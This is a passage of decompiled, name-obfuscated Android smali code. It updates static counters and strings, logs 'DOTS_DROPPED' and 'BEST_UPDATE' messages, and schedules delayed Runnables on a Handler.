    sget v5, Lڝږ؁ڋ/ؼ;->ؤ:I

    if-ge v9, v5, :cond_18

    sget v5, Lڝږ؁ڋ/ؼ;->ؤ:I

    if-lt v5, v3, :cond_18

    if-lez v9, :cond_18

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v5, "DOTS_DROPPED "

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v5, Lڝږ؁ڋ/ؼ;->ؤ:I

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v5, " -> "

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lڝږ؁ڋ/ؼ;->؋(Ljava/lang/String;)V

    invoke-static {}, Lڝږ؁ڋ/ؼ;->آ()V

    sput-boolean v2, Lڝږ؁ڋ/ؼ;->؋:Z

    sget-object v1, Lڝږ؁ڋ/ؼ;->آ:Ljava/lang/Runnable;

    if-eqz v1, :cond_17

    goto :goto_c

    :cond_17
    new-instance v1, Lڝږ؁ڋ/ػ;

    invoke-direct {v1}, Lڝږ؁ڋ/ػ;-><init>()V

    sput-object v1, Lڝږ؁ڋ/ؼ;->آ:Ljava/lang/Runnable;

    sget-object v2, Lڝږ؁ڋ/ؼ;->ؠ:Landroid/os/Handler;

    const-wide/16 v5, 0x1e

    invoke-virtual {v2, v1, v5, v6}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_18
    :goto_c
    sget v1, Lڝږ؁ڋ/ؼ;->ؤ:I

    if-le v4, v1, :cond_1a

    sput v4, Lڝږ؁ڋ/ؼ;->ؤ:I

    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    invoke-virtual {p0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object p0

    :goto_d
    invoke-interface {p0}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_19

    invoke-interface {p0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/Integer;

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_d

    :cond_19
    invoke-static {v0, v1}, Lڝږ؁ڋ/ؼ;->أ(Ljava/lang/String;Ljava/util/ArrayList;)Ljava/lang/String;

    move-result-object p0

    sput-object p0, Lڝږ؁ڋ/ؼ;->إ:Ljava/lang/String;

    sget-object p0, Lڝږ؁ڋ/ؼ;->ث:Ljava/util/ArrayList;

    const-string v0, ";"

    invoke-static {v0, p0}, Lڝږ؁ڋ/ؼ;->أ(Ljava/lang/String;Ljava/util/ArrayList;)Ljava/lang/String;

    move-result-object p0

    sput-object p0, Lڝږ؁ڋ/ؼ;->ئ:Ljava/lang/String;

    new-instance p0, Ljava/lang/StringBuilder;

    const-string v0, "BEST_UPDATE "

    invoke-direct {p0, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v0, Lڝږ؁ڋ/ؼ;->إ:Ljava/lang/String;

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {p0}, Lڝږ؁ڋ/ؼ;->؋(Ljava/lang/String;)V

    sget-object p0, Lڝږ؁ڋ/ؼ;->أ:Lڝږ؁ڋ/ا;

    if-nez p0, :cond_1a

    new-instance p0, Lڝږ؁ڋ/ا;

    const/4 v0, 0x7

    invoke-direct {p0, v0}, Lڝږ؁ڋ/ا;-><init>(I)V

    sput-object p0, Lڝږ؁ڋ/ؼ;->أ:Lڝږ؁ڋ/ا;

    sget-object v0, Lڝږ؁ڋ/ؼ;->ؠ:Landroid/os/Handler;

    const-wide/16 v1, 0x7d0

    invoke-virtual {v0, p0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :catch_3
    :cond_1a
    return-void
.end method
